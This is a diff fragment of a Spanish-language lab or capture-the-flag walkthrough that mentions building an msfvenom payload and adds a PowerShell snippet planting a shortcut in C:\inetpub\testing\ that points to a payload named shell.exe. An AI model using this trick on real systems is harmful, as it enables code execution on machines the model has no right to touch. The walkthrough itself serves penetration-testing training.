@@ -156,6 +156,14 @@ creamos un `exploit con msfvenom` y lo compartimos con la maquina victima con un
 ### shortcut C:\inetpub\testing\
 vamos a crear un shortcut en el directorio `C:\inetpub\testing\` 
 
+```python
+powershell
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\inetpub\testing\Notepad.url")
+$lnk.TargetPath = "c:\programdata\shell.exe"
+$lnk.Save()
+```
+
 
 
 
